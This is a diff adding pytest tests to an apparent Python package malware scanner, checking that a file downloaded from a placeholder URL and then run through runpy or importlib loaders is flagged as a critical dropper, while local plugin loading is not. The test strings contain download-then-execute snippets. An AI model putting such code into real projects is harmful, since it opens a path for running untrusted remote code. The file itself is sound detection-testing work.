@@ -385,3 +385,78 @@ class TestTheDropperGradeFollowsTheFlow:
         result = Scanner(Config.default().with_overrides(use_cache=False)).scan(root)
         grades = {f.rule_id: str(f.severity).rsplit(".", 1)[-1] for f in result.findings}
         assert grades.get("MALWARE.DROPPER.001") == "critical"
+
+
+class TestRunningADownloadedFileByLoader:
+    """`runpy.run_path` / `run_module`, a loader's `exec_module`, and `SourceFileLoader(...).load_module()` run
+    a file as code. Raised as EXECUTE, a download followed by one is the dropper's pair; a plugin loader that
+    runs a local file, with nothing downloaded in the file, is not (`DownloadFlow` says nothing downloaded runs)."""
+
+    URL = "https://api.vendor-service.net/x"
+    FETCH = f"import urllib.request\nurllib.request.urlretrieve('{URL}', 'x.py')\n"
+
+    @staticmethod
+    def grades(tmp_path, body: str) -> dict[str, str]:
+        return WheelKit.dropper_grades(tmp_path, WheelKit.module(body))
+
+    @pytest.mark.parametrize(
+        "run",
+        [
+            "import runpy\nrunpy.run_path('x.py')\n",
+            "from runpy import run_path\nrun_path('x.py')\n",
+            "import runpy\nrunpy.run_module('x')\n",
+            "import importlib.util\ns = importlib.util.spec_from_file_location('m', 'x.py')\n"
+            "m = importlib.util.module_from_spec(s)\ns.loader.exec_module(m)\n",
+            "import importlib.machinery\n"
+            "importlib.machinery.SourceFileLoader('m', 'x.py').load_module()\n",
+        ],
+    )
+    def test_a_download_then_a_loader_run_is_a_dropper(self, tmp_path, run: str) -> None:
+        got = self.grades(tmp_path, self.FETCH + run)
+        assert got.get("MALWARE.DROPPER.001") == "critical", got
+
+    def test_a_plugin_loader_running_a_local_file_forms_no_dropper(self, tmp_path) -> None:
+        body = (
+            "import importlib.util, requests\n"
+            "def load(path):\n"
+            "    spec = importlib.util.spec_from_file_location('plugin', path)\n"
+            "    module = importlib.util.module_from_spec(spec)\n"
+            "    spec.loader.exec_module(module)\n"
+            "    return module\n"
+            f"requests.post('{self.URL}', json={{}})\n"
+            "load('plugin.py')\n"
+        )
+        got = self.grades(tmp_path, body)
+        assert "MALWARE.DROPPER.001" not in got, got
+
+    def test_a_plugin_loader_beside_a_download_it_never_runs_forms_no_dropper(
+        self, tmp_path
+    ) -> None:
+        body = (
+            "import importlib.util, requests\n"
+            f"requests.get('{self.URL}').json()\n"
+            "spec = importlib.util.spec_from_file_location('plugin', 'plugin.py')\n"
+            "module = importlib.util.module_from_spec(spec)\n"
+            "spec.loader.exec_module(module)\n"
+        )
+        assert "MALWARE.DROPPER.001" not in self.grades(tmp_path, body)
+
+    def test_a_downloaded_path_given_to_run_path_as_a_variable(self, tmp_path) -> None:
+        body = (
+            "import runpy, urllib.request\n"
+            f"path, _ = urllib.request.urlretrieve('{self.URL}', 'x.py')\n"
+            "runpy.run_path(path)\n"
+        )
+        assert self.grades(tmp_path, body).get("MALWARE.DROPPER.001") == "critical"
+
+    def test_a_plugin_loader_with_no_network_forms_no_dropper(self, tmp_path) -> None:
+        body = (
+            "import importlib.util\n"
+            "spec = importlib.util.spec_from_file_location('plugin', 'plugin.py')\n"
+            "module = importlib.util.module_from_spec(spec)\n"
+            "spec.loader.exec_module(module)\n"
+        )
+        assert not self.grades(tmp_path, body)
+
+    def test_run_path_of_a_local_file_with_no_network_forms_no_dropper(self, tmp_path) -> None:
+        assert not self.grades(tmp_path, "import runpy\nrunpy.run_path('tool.py')\n")
